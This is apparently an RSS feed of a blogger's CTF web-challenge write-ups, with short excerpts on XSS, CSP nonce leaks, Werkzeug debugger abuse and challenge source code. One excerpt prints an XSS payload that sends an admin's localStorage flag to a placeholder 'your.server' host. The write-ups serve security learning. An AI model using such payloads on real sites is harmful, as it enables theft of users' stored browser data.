<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>web on VIE</title>
    <link>https://jamvie.net/tags/web/</link>
    <description>Recent content in web on VIE</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
    <lastBuildDate>Thu, 01 Sep 2022 14:50:08 -0600</lastBuildDate><atom:link href="https://jamvie.net/tags/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>MapleCTF 2022    : Vie&#39;s challenges</title>
      <link>https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/</link>
      <pubDate>Thu, 01 Sep 2022 14:50:08 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/</guid>
      <description>MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here.</description>
    </item>
    
    <item>
      <title>NahamCon CTF 2022</title>
      <link>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</link>
      <pubDate>Mon, 02 May 2022 12:40:52 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</guid>
      <description>Just in Time Maple Bacon played in NahamCon CTF 2022 this past weekend, which came as a surprise - we were fully planning on focusing our efforts onto AngstromCTF which overlapped, however, NahamCon CTF proved to be interesting and good-quality so a last-minute decision was made to participate in both. AngstromCTF is still underway, but in the awkward passage of time between my last week and weekend, I played in NahamCon CTF for a little bit of practice.</description>
    </item>
    
    <item>
      <title>B01lers CTF 2022: hacker/place</title>
      <link>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</link>
      <pubDate>Tue, 26 Apr 2022 19:59:24 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</guid>
      <description>Thoughts This year&amp;rsquo;s b01lers CTF was a great one for Maple Bacon, given that we came in first. A fantastic development, especially since last year we landed in 7th, so we&amp;rsquo;ve certainly improved a great deal since then.
While the balance of problems was skewed, the CTF was overall an enjoyable experience. It was nice to delve into the different problems outside of web (whilst waiting for the one (1) web challenge to release), which reminded me I really need to touch up on my reversing skills, a 2022 new year resolution that I wanted to get into.</description>
    </item>
    
    <item>
      <title>ASIS Quals 2021: Lovely Nonce</title>
      <link>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</link>
      <pubDate>Sun, 24 Oct 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</guid>
      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>
    </item>
    
    <item>
      <title>RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</title>
      <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</link>
      <pubDate>Fri, 20 Aug 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</guid>
      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;rsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
The provided source has some interesting code:
notes/app.py
@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
    </item>
    
    <item>
      <title>RaRCTF2021: Some simpler web probz</title>
      <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
      <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
Insert as your payload:
title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
    </item>
    
    <item>
      <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</link>
      <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</guid>
      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
    </item>
    
    <item>
      <title>Bo1lersCTF 2021: Lorem_Ipsum</title>
      <link>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</link>
      <pubDate>Sun, 04 Apr 2021 03:12:16 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</guid>
      <description>Lorem_Ipsum gave nothing but a simple homepage that allowed you to see &amp;ldquo;animal&amp;rdquo;-ified versions of the famous lorem ipsum placeholder text.
Choose among the available animals, and notice a GET query parameter that looks something like ?animal=dogs. What if you gave it text garbage instead of an expected animal?
This is a Werkzeug debugger! What fun, since Werkzeug in development mode will give you a python console with every traceback that is reported to you when something wrong happens.</description>
    </item>
    
    <item>
      <title>UTCTF 2021</title>
      <link>https://jamvie.net/posts/2021/03/utctf-2021/</link>
      <pubDate>Sun, 14 Mar 2021 17:17:38 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2021/03/utctf-2021/</guid>
      <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
Source it! Inspect source. You&amp;rsquo;ll find it.
Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>
    </item>
    
    <item>
      <title>DiceCTF 2021</title>
      <link>https://jamvie.net/posts/2021/02/dicectf-2021/</link>
      <pubDate>Sun, 07 Feb 2021 19:06:12 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/02/dicectf-2021/</guid>
      <description>Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`} &amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>
    </item>
    
  </channel>
</rss>
